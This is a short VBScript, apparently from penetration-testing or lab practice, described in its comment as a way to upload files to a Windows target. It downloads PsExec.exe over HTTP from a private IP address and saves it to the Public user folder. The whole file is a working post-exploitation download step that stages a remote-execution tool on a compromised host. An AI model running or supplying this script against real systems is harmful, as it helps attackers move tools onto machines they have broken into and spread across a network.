' This script is used to upload files to a windows target

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") 
dim bStrm: Set bStrm = createobject("Adodb.Stream") 
xHttp.Open "GET", "http://10.11.0.199/PsExec.exe", False 
xHttp.Send 
with bStrm 
.type = 1 '//binary 
.open 
.write xHttp.responseBody 
.savetofile "C:\Users\Public\PsExec.exe", 2  '// define location to save file!!
end with 
